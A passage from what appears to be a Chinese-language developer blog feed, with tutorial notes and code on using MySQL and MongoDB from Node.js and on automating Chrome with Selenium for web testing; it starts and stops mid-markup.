class="hljs-string">&#x27;root&#x27;</span>,<br>    <span class="hljs-attr">password</span>: <span class="hljs-string">&#x27;ztdgz947&#x27;</span><br>&#125;);<br><br><span class="hljs-comment">//链接mysql-connect函数</span><br>connection.connect(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">err</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(err)&#123;<br>        <span class="hljs-built_in">console</span>.log(err.stack)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br><br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;connected as id&quot;</span> + connection.threadId);<br>&#125;)<br></code></pre></td></tr></table></figure><p>对于数据库最主要的查询功能，使用query函数</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//查询数据<br><span class="hljs-keyword">connection</span>.query(<span class="hljs-string">&#x27;select * from student&#x27;</span>,<span class="hljs-keyword">function</span> (err, <span class="hljs-keyword">rows</span>) &#123;<br>    <span class="hljs-keyword">if</span>(err)&#123;<br>        console.log(err);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        console.log(<span class="hljs-keyword">rows</span>);<br>    &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>为了防止sql注入，我们使用<code>connection.escape()</code>包裹需要拼接的内容</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">let sql = &#x27;<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> userid=<span class="hljs-string">&#x27; + connection.escape(userid)</span><br></code></pre></td></tr></table></figure><p>然后就可以将sql作为query函数的第一个参数</p><h3 id="4-2MongoDB"><a href="#4-2MongoDB" class="headerlink" title="4.2MongoDB"></a>4.2MongoDB</h3><p>MongoDB则是数据库的另一种类型的代表，nosql（非关系型数据库）</p><p>MongoDB这种非关系型数据库常常用于更大数据量的开发过程，储存结构虽然不标准但是功能更强大</p><p>依然是使用connect进行连接</p><p>url方面：<code>mongodb://user:pass@localhost:port/database</code> 其中user是用户名，pass是密码，port是端口号</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs qml"><span class="hljs-keyword">const</span> mongoose = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;mongoose&#x27;</span>);<br><br><span class="hljs-comment">//设计url</span><br><span class="hljs-keyword">const</span> <span class="hljs-built_in">url</span> = <span class="hljs-string">&#x27;mongodb://localhost/article&#x27;</span>;<br><br><span class="hljs-comment">//链接数据库</span><br>mongoose.connect(<span class="hljs-built_in">url</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">err</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(err) &#123;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;connect failed&#x27;</span>);<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;connect success&#x27;</span>);    <br>&#125;)<br></code></pre></td></tr></table></figure><p>然后我们可以使用model和save插入到集合中</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs qml"><span class="hljs-keyword">const</span> mongoose = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;mongoose&#x27;</span>);<br><br><span class="hljs-comment">//设计url</span><br><span class="hljs-keyword">const</span> <span class="hljs-built_in">url</span> = <span class="hljs-string">&#x27;mongodb://localhost/article&#x27;</span>;<br><br><span class="hljs-comment">//链接数据库</span><br>mongoose.connect(<span class="hljs-built_in">url</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">err</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(err) &#123;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;connect failed&#x27;</span>);<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;connect success&#x27;</span>);    <br>&#125;)<br><br><span class="hljs-comment">// 定义一个模块的Schema</span><br><span class="hljs-keyword">const</span> ArticleSchema = <span class="hljs-keyword">new</span> mongoose.Schema(&#123;<br>    <span class="hljs-attribute">title</span>: <span class="hljs-built_in">String</span>,<br>    <span class="hljs-attribute">author</span>: <span class="hljs-built_in">String</span>,<br>    <span class="hljs-attribute">content</span>: <span class="hljs-built_in">String</span>,<br>    <span class="hljs-attribute">publishTime</span>: <span class="hljs-built_in">Date</span><br>&#125;);<br><br><span class="hljs-comment">//使用model方法注册一个model</span><br>mongoose.model(<span class="hljs-string">&#x27;Article&#x27;</span>,ArticleSchema);<br><span class="hljs-keyword">const</span> Article = mongoose.model(<span class="hljs-string">&#x27;Article&#x27;</span>);<br><span class="hljs-keyword">let</span> art = <span class="hljs-keyword">new</span> Article(&#123;<br>    <span class="hljs-attribute">title</span>: <span class="hljs-string">&#x27;node.js&#x27;</span>,<br>    <span class="hljs-attribute">author</span>: <span class="hljs-string">&#x27;node&#x27;</span>,<br>    <span class="hljs-attribute">content</span>: <span class="hljs-string">&#x27;node.js is great&#x27;</span>,<br>    <span class="hljs-attribute">publishTime</span>: <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>()<br>&#125;);<br><br><span class="hljs-comment">//将这个文档插入集合中</span><br>art.save(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">err</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(err)&#123;<br>        <span class="hljs-built_in">console</span>.log(err);<br>    &#125;<span class="hljs-title">else</span>&#123;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;save successed&#x27;</span>);<br>    &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>显示 save successed之后可以在MongoDB compass中查看数据库内容</p><p>查询和更改</p><p>首先<strong>查询和更改的执行顺序高于插入</strong>，每次都是在find结果出来之后才显示的save successed</p><p>如果我们查询和插入在一起执行，就会出现错误</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">connect</span> success<br><span class="hljs-keyword">result</span>: <br>save successed<br></code></pre></td></tr></table></figure><p>查询使用find和findOne方法，一个是返回所有数据，findOne是返回第一个查询到的数据</p><p>对于更改方法，我们发现更改之后的docs就立马发生了变化，我们可以猜想，<strong>docs设置了响应式</strong>，查询结果的数据改变那么docs也会改变</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//查询模块</span><br><span class="hljs-comment">//find第一个参数是查询条件，fun中的第二个参数是查询结果</span><br>Article.find(&#123;<span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;node.js&#x27;</span>&#125;,<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">err, docs</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(err)&#123;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;error&#x27;</span>);<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;result: &quot;</span> + docs);<br>    <span class="hljs-comment">//修改数据</span><br>    docs[<span class="hljs-number">0</span>].title = <span class="hljs-string">&#x27;javascript&#x27;</span>;<br>    docs[<span class="hljs-number">0</span>].save();<br>    <span class="hljs-comment">//再一次打印结果改变，说明docs是实时更新</span><br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;new result: &quot;</span>+ docs);<br>&#125;)<br></code></pre></td></tr></table></figure><p>删除数据就使用remove，在遍历中加一个条件，实现条件过滤</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-comment">//删除数据</span><br><span class="hljs-selector-tag">if</span>(docs)&#123;<br>    <span class="hljs-selector-tag">docs</span><span class="hljs-selector-class">.forEach</span>(ele =&gt; &#123;<br>        <span class="hljs-comment">//条件删除</span><br>        <span class="hljs-selector-tag">if</span>(ele.title == <span class="hljs-string">&#x27;javascript&#x27;</span>)&#123;<br>            <span class="hljs-selector-tag">ele</span><span class="hljs-selector-class">.remove</span>()<br>        &#125;<br>    &#125;);<br><br>    <span class="hljs-selector-tag">console</span><span class="hljs-selector-class">.log</span>(docs);<br>&#125;<br></code></pre></td></tr></table></figure><p>直接连接MongoDB：</p><p>但是好像server模块有点问题</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs qml"><span class="hljs-keyword">const</span> mongoClient = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;mongodb&#x27;</span>).MongoClient;<br><span class="hljs-comment">//Db获取数据库实例</span><br><span class="hljs-keyword">const</span> Db = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;mongodb&#x27;</span>).Db;<br><span class="hljs-comment">//获取服务器实例</span><br><span class="hljs-keyword">const</span> server = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;mongodb&#x27;</span>).server;<br><span class="hljs-comment">//新建数据库</span><br><span class="hljs-keyword">const</span> studentDb = <span class="hljs-keyword">new</span> Db(<span class="hljs-string">&#x27;student&#x27;</span>, <span class="hljs-keyword">new</span> server(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-string">&#x27;27017&#x27;</span>));<br><br><span class="hljs-keyword">let</span> student = &#123;<br>    <span class="hljs-attribute">id:</span><span class="hljs-string"> &#x27;1101&#x27;,</span><br><span class="hljs-string">    name</span>: <span class="hljs-string">&#x27;jack&#x27;</span>,<br>    <span class="hljs-attribute">age</span>: <span class="hljs-number">12</span><br>&#125;<br><br><span class="hljs-comment">//打开数据库</span><br>studentDb.open(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">err, db</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(err)&#123;<br>        <span class="hljs-built_in">console</span>.log(err);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//打开集合</span><br>    db.collection(<span class="hljs-string">&#x27;student&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">err, collection</span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(err)&#123;<br>            <span class="hljs-built_in">console</span>.log(err);<br>            studentDb.close();<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    <br>        <span class="hljs-comment">//插入文档doc</span><br>        collection.insertOne(student, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">err, doc</span>) </span>&#123;<br>            <span class="hljs-comment">//关闭数据库</span><br>            studentDb.close();<br>            <span class="hljs-keyword">if</span>(err)&#123;<br>                <span class="hljs-built_in">console</span>.log(err);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>            <span class="hljs-built_in">console</span>.log(doc[<span class="hljs-number">0</span>]);<br>        &#125;)<br><br>    &#125;)<br>&#125;)<br><br><span class="hljs-comment">//连接mongodb</span><br><span class="hljs-comment">// mongoClient.connect(url, function (err, db) &#123;</span><br><span class="hljs-comment">//     if(err)&#123;</span><br><span class="hljs-comment">//         console.log(err);</span><br><span class="hljs-comment">//         return;</span><br><span class="hljs-comment">//     &#125;</span><br><span class="hljs-comment">//     console.log(&quot;connect success&quot;);</span><br><span class="hljs-comment">// &#125;)</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>node.js</category>
      
    </categories>
    
    
    <tags>
      
      <tag>node.js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>selenium</title>
    <link href="/2022/10/18/selenium/"/>
    <url>/2022/10/18/selenium/</url>
    
    <content type="html"><![CDATA[<h1 id="selenium"><a href="#selenium" class="headerlink" title="selenium"></a>selenium</h1><p>selenium用于进行我们的性能测试和功能测试，常用与web端和应用端</p><h2 id="1-eclipse-配置"><a href="#1-eclipse-配置" class="headerlink" title="1.eclipse 配置"></a>1.eclipse 配置</h2><p>首先，配置maven，然后创建一个maven项目</p><p>使用new project，然后搜索maven创建新的maven项目</p><p>group Id：是公司名称，使用com.xxx即可</p><p>artifact Id：包名称，也就是我们的项目名称</p><p>packaging：打包方式 有jar war等等</p><p><img src="https://img-blog.csdnimg.cn/957963d514bf420cb341fc13ffa8ed11.png" alt="新建maven项目"></p><p>创建之后得到我们常见的项目目录，有开发人员的main和测试人员的test</p><p>然后我们打开pom.xml</p><p>应用selenium的dependence</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"> <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- selenium --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.seleniumhq.selenium<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>selenium-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.141.59<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span> <br></code></pre></td></tr></table></figure><p>然后在test/java中需要写，这样我们就能操作Chrome打开百度网站</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">package</span> com.test;<br><br><span class="hljs-keyword">import</span> org.openqa.selenium.chrome.ChromeDriver;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">firstWebTest</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span> arg[]) &#123;<br><span class="hljs-comment">//使用浏览器driver</span><br>ChromeDriver chromeriver = <span class="hljs-keyword">new</span> <span class="hljs-type">ChromeDriver</span>();<br><span class="hljs-comment">//访问百度</span><br>chromeriver.<span class="hljs-keyword">get</span>(<span class="hljs-string">&quot;https://www.baidu.com&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-基本元素定位"><a href="#2-基本元素定位" class="headerlink" title="2.基本元素定位"></a>2.基本元素定位</h2><p>根据元素id进行定位，如果定位对象是一个input框，可以使用sendKeys填入数据，如果定位对象是一个按钮的话，就可以使用<code>.click</code>方法触发点击事件</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">firstWebTest</span> &#123;</span><br><span class="hljs-comment">//设置全局变量</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ChromeDriver chromeDriver;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">String</span> arg[])</span> </span>&#123;<br><span class="hljs-built_in">openChrome</span>();<br><span class="hljs-comment">//定位到百度输入框并输入数据</span><br>chromeDriver.<span class="hljs-built_in">findElement</span>(By.<span class="hljs-built_in">id</span>(<span class="hljs-string">&quot;kw&quot;</span>)).<span class="hljs-built_in">sendKeys</span>(<span class="hljs-string">&quot;腾讯课堂&quot;</span>);<br><span class="hljs-comment">//定位到点击一下按钮</span><br>chromeDriver.<span class="hljs-built_in">findElement</span>(By.<span class="hljs-built_in">id</span>(<span class="hljs-string">&quot;su&quot;</span>)).<span class="hljs-built_in">click</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">openChrome</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-comment">//使用浏览器driver</span><br>chromeDriver = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ChromeDriver</span>();<br><span class="hljs-comment">//访问百度</span><br>chromeDriver.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;https://www.baidu.com&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>更改By.xxx 的内容进行更改，如改为By.name</p><p>还可以使用tagName去定位，tagName是什么呢？简单来说 html5标签</p><p>还有根据className（class）和linkText（超链接文本值定位）partiaLinxText（部分超链接文本定位）</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-comment">//使用linkTest点击超链接</span><br><span class="hljs-selector-tag">chromeDriver</span><span class="hljs-selector-class">.findElement</span>(By.partialLinkText(<span class="hljs-string">&quot;百度首页&quot;</span>))<span class="hljs-selector-class">.click</span>();<br></code></pre></td></tr></table></figure><p>这样我们就可以又回到百度首页</p><h2 id="3-特殊定位"><a href="#3-特殊定位" class="headerlink" title="3.特殊定位"></a>3.特殊定位</h2><h3 id="1-css定位"><a href="#1-css定位" class="headerlink" title="1.css定位"></a>1.css定位</h3><p>根据id定位需要加#</p><p>根据class定位需要加.  如果是复合类名就需要在两个类名之间中.做分割</p><p><img src="https://img-blog.csdnimg.cn/ea0618cd28dc4d9292bb77be3d66cef0.png" alt="css定位"></p><p>我们还有更精确的定位方式，<strong>我们在f12中使用Ctrl+F打开搜索功能</strong>，然后按照  <code>标签名[key=&quot;value&quot;]</code>的形式查找唯一符合标准的元素</p><p>然后到selenium中使用cssSelector操作</p><p><img src="https://img-blog.csdnimg.cn/5a6a2280407a45b3969da5f7e7c23058.png" alt="精确定位"></p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-comment">//使用精确定位</span><br><span class="hljs-selector-tag">chromeDriver</span><span class="hljs-selector-class">.findElement</span>(By.cssSelector(<span class="hljs-string">&quot;a[class=&#x27;&#x27;]&quot;</span>))<span class="hljs-selector-class">.click</span>();<br></code></pre></td></tr></table></figure><h3 id="2-Xpath定位"><a href="#2-Xpath定位" class="headerlink" title="2.Xpath定位"></a>2.Xpath定位</h3><p>这种定位有绝对路径和相对路径两种</p><p>绝对路径的耦合性较大：</p><p>需要从/html/body开始一路向下找到我们所需要定位的元素</p><p>相对路径由@开头：</p><p><img src="https://img-blog.csdnimg.cn/0f648cedbc1246b3a79323fcb1b27cc4.png" alt="Xpath相对路径定位"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">chromeDriver<span class="hljs-selector-class">.findElement</span>(By<span class="hljs-selector-class">.xpath</span>(&quot;//<span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[@class=<span class="hljs-string">&#x27;&#x27;</span>]</span><span class="hljs-selector-attr">[@tabindex=<span class="hljs-string">&#x27;0&#x27;</span>]</span>&quot;))<span class="hljs-selector-class">.click</span>();<br></code></pre></td></tr></table></figure><p>这里还可以根据文本定位，使用：text()</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">chromeDriver<span class="hljs-selector-class">.findElement</span>(By<span class="hljs-selector-class">.xpath</span>(&quot;//<span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[text()=<span class="hljs-string">&#x27;官方&#x27;</span>]</span>&quot;))<span class="hljs-selector-class">.click</span>();<br></code></pre></td></tr></table></figure><h2 id="4-元素操作"><a href="#4-元素操作" class="headerlink" title="4.元素操作"></a>4.元素操作</h2><p>一些常用的元素操作有：</p><p>click()：执行点击操作</p><p>clear()：执行清空处理</p><table><thead><tr><th>更多操作方法</th><th>描述</th></tr></thead><tbody><tr><td>click(on_element=None)</td><td>单击鼠标左键</td></tr><tr><td>click_and_hold(on_element=None)</td><td>单击鼠标左键,不松开</td></tr><tr><td>context_click(on_element=None)</td><td>单击鼠标右键</td></tr><tr><td>double_click(on_element=None)</td><td>双击鼠标左键</td></tr><tr><td>drag_and_drop(soure, target)</td><td>拖动到某个元素然后松开</td></tr><tr><td>drag_and_drop_by_offset(soure,xoffset, yoffset)</td><td>拖动到某个坐标然后松开</td></tr><tr><td>key_down(value, element=None)</td><td>按下某个键盘上的键</td></tr><tr><td>key_up(value, element=None)</td><td>松开某个键</td></tr><tr><td>move_by_offset(xoffset, yoffset)</td><td>鼠标指针从当前位置移动到某个坐标</td></tr><tr><td>move_to_element(to_element)</td><td>鼠标指针移动到某个元素</td></tr><tr><td>move_to_element_with_offset(to_element,xoffset,yoffset)</td><td>移动到距某个元素（左上角坐标）多少距离的位置</td></tr><tr><td>perform()</td><td>执行链中的所有动作</td></tr><tr><td>release(on_element=None)</td><td>在某个元素位置松开鼠标左键</td></tr><tr><td>send_keys(keys_to_send)</td><td>发送某个键到当前焦点的元素</td></tr><tr><td>send_keys_to_element(element, keys_to_send)</td><td>发生某个键到指定的元素</td></tr></tbody></table><p>键盘事件：</p><p><img src="https://img-blog.csdnimg.cn/5de3d351654c441e95e48050ed2031ec.png" alt="键盘事件"></p><p>时间等待：sleep</p><p>sleep需要使用try catch包裹起来，使用Thread.sleep()实现</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">try</span> &#123;<br>driver.get(<span class="hljs-string">&quot;https://music.91q.com/&quot;</span>);<br>driver.find<span class="hljs-constructor">Element(By.<span class="hljs-params">linkText</span>(<span class="hljs-string">&quot;歌单&quot;</span>)</span>).click<span class="hljs-literal">()</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Thread</span>.</span></span>sleep(<span class="hljs-number">1000</span>);<br>driver.find<span class="hljs-constructor">Element(By.<span class="hljs-params">xpath</span>(<span class="hljs-string">&quot;//span[@title=\&quot;电子\&quot;]&quot;</span>)</span>).click<span class="hljs-literal">()</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Thread</span>.</span></span>sleep(<span class="hljs-number">1000</span>);<br>driver.find<span class="hljs-constructor">Element(By.<span class="hljs-params">xpath</span>(<span class="hljs-string">&quot;//img[@src=\&quot;https://img01.dmhmusic.com/0105/M00/E9/A4/ChR45GKy4m2AGwKiAAuLrKC1ZgU349.jpg@w_300,h_300\&quot;]&quot;</span>)</span>).click<span class="hljs-literal">()</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Thread</span>.</span></span>sleep(<span class="hljs-number">1000</span>);<br>&#125;catch(Exception e)&#123;<br>e.print<span class="hljs-constructor">StackTrace()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>页面API：</p><p><img src="https://img-blog.csdnimg.cn/0ae37f230d454c48bf694265e0d05f49.png" alt="页面API"></p><p>一般测试结束后都会调用quit函数，关闭浏览器</p><p>操作实例</p><p>这里的回退操作我本来想用<code>back()</code>的</p><p>但是这里调用back会回到<code>data;</code>（因为没有点击click开启搜索，所以还是在第一个页面），所以就先使用to调转</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">open</span><span class="hljs-constructor">Chrome()</span>;<br>chromeDriver.find<span class="hljs-constructor">Element(By.<span class="hljs-params">id</span>(<span class="hljs-string">&quot;kw&quot;</span>)</span>).send<span class="hljs-constructor">Keys(<span class="hljs-string">&quot;swpu&quot;</span>)</span>;<br><span class="hljs-comment">//睡眠三秒</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Thread</span>.</span></span>sleep(<span class="hljs-number">3000</span>);<br><span class="hljs-comment">//清空内容</span><br>chromeDriver.find<span class="hljs-constructor">Element(By.<span class="hljs-params">id</span>(<span class="hljs-string">&quot;kw&quot;</span>)</span>).clear<span class="hljs-literal">()</span>;<br><span class="hljs-comment">//获取元素属性</span><br>WebElement webElement1 = chromeDriver.find<span class="hljs-constructor">Element(By.<span class="hljs-params">id</span>(<span class="hljs-string">&quot;kw&quot;</span>)</span>);<br><span class="hljs-comment">//输出标签名</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.print(webElement1.get<span class="hljs-constructor">TagName()</span>);<br><span class="hljs-comment">//回退</span><br>chromeDriver.navigate<span class="hljs-literal">()</span>.<span class="hljs-keyword">to</span>(<span class="hljs-string">&quot;https://www.baidu.com&quot;</span>);<br><span class="hljs-comment">//输出文本值</span><br>WebElement webElement2 = chromeDriver.find<span class="hljs-constructor">Element(By.<span class="hljs-params">xpath</span>(<span class="hljs-string">&quot;//a[text()=\&quot;hao123\&quot;]&quot;</span>)</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.print(webElement2.get<span class="hljs-constructor">Text()</span>);<br><span 